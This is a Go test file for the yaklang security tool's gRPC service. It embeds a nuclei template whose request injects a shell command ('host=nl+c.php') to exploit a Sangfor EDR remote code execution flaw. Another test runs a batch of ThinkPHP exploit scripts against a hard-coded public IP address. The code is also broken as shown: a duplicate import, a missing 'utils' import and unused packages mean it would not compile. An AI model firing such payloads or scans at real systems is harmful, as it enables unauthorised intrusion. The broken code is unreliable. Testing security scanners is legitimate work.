package yakgrpc

import (
	"context"
	"fmt"
	"github.com/yaklang/yaklang/common/netx"
	"net"
	"net/http"
	"testing"
	"time"

	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"io"
	"testing"
	"google.golang.org/grpc"
)

func init() {
	consts.GetGormProfileDatabase()
	consts.GetGormProjectDatabase()
}

func TestGRPCMUSTPASS_EXEC_YAK_SCRIPT(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		panic(err)
	}
	name, err := yakit.CreateTemporaryYakScript("nuclei", `id: CNVD-2020-46552

info:
  name: Sangfor EDR - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could execute arbitrary commands on the target host.
  reference:
    - https://www.modb.pro/db/144475
    - https://blog.csdn.net/bigblue00/article/details/108434009
    - https://cn-sec.com/archives/721509.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: cnvd,cnvd2020,sangfor,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "$show_input = function($info)")'
          - 'contains(body, "$strip_slashes($host)")'
          - 'contains(body, "Log Helper")'
          - 'status_code == 200'
        condition: and

# Enhanced by mp on 2022/05/18
`)
	host, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\n\r\nHello, world!"))

	stream, err := client.ExecYakScript(context.Background(), &ypb.ExecRequest{
		ScriptId: name,
		Params: []*ypb.ExecParamItem{
			{Key: "target", Value: fmt.Sprintf("http://%s:%d", host, port)},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	for {
		data, err := stream.Recv()
		if err != nil {
			break
		}
		spew.Dump(data)
	}
}

func TestNewServer(t *testing.T) {
	test := assert.New(t)

	client, err := NewLocalClient()
	if err != nil {
		test.FailNow(err.Error())
		return
	}

	stream, err := client.ExecBatchYakScript(context.Background(), &ypb.ExecBatchYakScriptRequest{
		Target:              "16.170.15.55:8005",
		Keyword:             "thinkphp",
		Limit:               10,
		TotalTimeoutSeconds: 1000,
		Concurrent:          4,
	})
	if err != nil {
		test.FailNow(err.Error())
		return
	}

	for {
		rsp, err := stream.Recv()
		if err != nil {
			break
		}
		spew.Dump(rsp)
	}
}

func TestGRPCMUSTPASS_NesureProxyValidInExecBatchYakScript(t *testing.T) {

	client, err := NewLocalClient()
	if err != nil {
		panic(err)
	}
	name, err := yakit.CreateTemporaryYakScript("mitm", `
mirrorHTTPFlow = func(isHttps, url , req , rsp , body ) {
    	poc.HTTP(req,poc.https(isHttps),poc.replaceQueryParam("key", "1"))
}
`)
	count := 0
	host, port := utils.DebugMockHTTPHandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "CONNECT" {
			w.Write([]byte("HTTP/1.0 200 Connection established\r\n\r\n"))
		} else if keys, ok := r.URL.Query()["key"]; ok && keys[0] == "1" {
			count++
		}
		w.Write([]byte("HTTP/1.1 200 OK\r\n\r\nHello, world!"))
	})

	stream, err := client.ExecBatchYakScript(context.Background(), &ypb.ExecBatchYakScriptRequest{
		Target:              "http://www.baidu.com?key=0",
		ScriptNames:         []string{name},
		Limit:               10,
		TotalTimeoutSeconds: 1000,
		Concurrent:          4,
		Proxy:               fmt.Sprintf("http://%s:%d", host, port),
	})
	if err != nil {
		t.Fatal(err)
	}
	for {
		_, err := stream.Recv()
		if err != nil {
			break
		}
	}
	if count <= 0 {
		t.Fatalf("want more than 1 ,but got %d", count)
	}
}
